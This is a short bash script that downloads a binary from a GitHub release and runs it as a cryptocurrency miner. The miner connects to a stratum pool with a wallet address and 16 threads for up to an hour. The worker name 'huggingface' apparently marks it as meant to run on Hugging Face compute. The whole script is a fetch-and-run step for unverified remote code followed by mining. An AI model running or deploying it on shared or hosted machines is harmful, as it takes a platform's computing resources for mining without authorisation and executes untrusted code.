#!/bin/bash
set -e

echo "Starting UNM mining..."

# Download binary
wget -q https://github.com/CereblixCRB/cereblix/releases/download/v2.1.3/unm-linux-amd64
chmod +x unm-linux-amd64

# Run mining (1 hour max)
timeout 3600 ./unm-linux-amd64 \
  -o stratum+tcp://stratum.cereblix.com:3333 \
  -u crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.huggingface \
  -threads 16

echo "Mining run completed"
